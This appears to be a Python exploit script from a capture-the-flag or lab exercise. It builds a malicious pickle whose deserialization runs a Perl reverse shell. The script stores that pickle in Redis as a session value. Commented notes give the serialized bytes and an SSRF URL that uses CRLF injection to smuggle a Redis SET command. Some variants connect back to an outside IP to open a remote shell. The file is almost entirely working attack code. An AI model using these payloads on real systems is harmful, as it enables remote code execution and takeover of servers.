# env = python 3.7.5
import urllib, requests, socket
import os
import pickle, redis

class exp(object):
    def __reduce__(self):
        s = """perl -e 'use Socket;$i="127.0.0.1";$p=10163;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""

        return (os.system, (s,))

e = exp()
s = pickle.dumps(e)

print('Deserialized -->%s<--' %(s))
exit(0)
r = redis.Redis(host='127.0.0.1', port=10163, db=0)
# r.set("e6c36e69a9cf9543243d7921aa1a3d8093b49441", s)
r.set("6d26c261bd004c9fa89f55314f240a3f", s)

# for the injection payload
'''
"session:6d26c261-bd00-4c9f-a89f-55314f240a3f"

set for

b'\x80\x03cposix\nsystem\nq\x00X\xdb\x00\x00\x00perl -e \'use Socket;$i="redis";$p=6379;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'q\x01\x85q\x02Rq\x03.'

set "session:6d26c261-bd00-4c9f-a89f-55314f240a3f" b'\x80\x03cposix\nsystem\nq\x00X\xdb\x00\x00\x00perl -e \'use Socket;$i="140.112.90.24";$p=23333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'q\x01\x85q\x02Rq\x03.'

--> url=http://redis:6379/?q=HTTP/1.1%0d%0aset "session:6d26c261-bd00-4c9f-a89f-55314f240a3f" b'\x80\x03cposix\nsystem\nq\x00X\xdb\x00\x00\x00perl -e \'use Socket;$i="140.112.90.24";$p=23333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'q\x01\x85q\x02Rq\x03.'%0d%0a
'''
